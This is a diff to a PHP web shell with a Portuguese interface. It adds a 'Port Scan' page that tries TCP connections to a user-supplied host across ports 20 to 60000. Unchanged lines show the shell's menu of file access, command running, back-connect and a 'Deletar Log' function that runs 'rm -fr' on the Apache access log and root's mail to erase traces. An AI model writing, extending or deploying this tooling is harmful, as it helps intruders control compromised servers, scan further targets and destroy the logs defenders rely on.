@@ -330,6 +330,7 @@ echo "
 			<li><a href='shell.php'>Arquivos</a></li>
 			<li><a href='?pag=comandos'>Comandos</a></li>
 			<li><a href='?pag=whois'>Whois</a></li>
+			<li><a href='?pag=pscan'>Port Scan</a></li>
 			<li><a href='?pag=dellog'>Deletar Log</a></li>
 			<li><a href='?pag=conexao'>Conexão</a></li>
 			<li><a href='?pag=lookup'>Lookup</a></li>
@@ -459,6 +460,17 @@ else if($page == 'dellog'){
 	<header>Deletar Log</header>
 	<article>
 	";dellog();echo"
+	</article>
+	</section>
+	";
+}
+
+else if($page == 'pscan'){
+	echo "
+	<section>
+	<header>Port Scan</header>
+	<article>
+	";pscan();echo"
 	</article>
 	</section>
 	";
@@ -798,6 +810,25 @@ function dellog(){
 	system("rm -fr /var/log/apache2/access.log");
 	system("rm -fr /var/mail/root");
 	echo "Log deletado!";
+}
+
+function pscan(){
+	echo "
+	<form action='shell.php?pag=pscan' method='post'>
+	Host: <input type='text' name='hostadr'>
+	<input type='submit' name='inciarscan' value='Escanear'>
+	</form>
+	";
+	$scanip = $_POST['hostadr'];
+	$psock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+	for($porta = 20; $porta <= 60000; $porta++) {
+	$conexao = socket_connect($psock, $scanip, $porta);
+	if($conexao){
+		echo "Porta $porta esta aberta <br />";
+		socket_close($psock);
+		$psock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+	}
+    }
 }
 
 function backconnect()
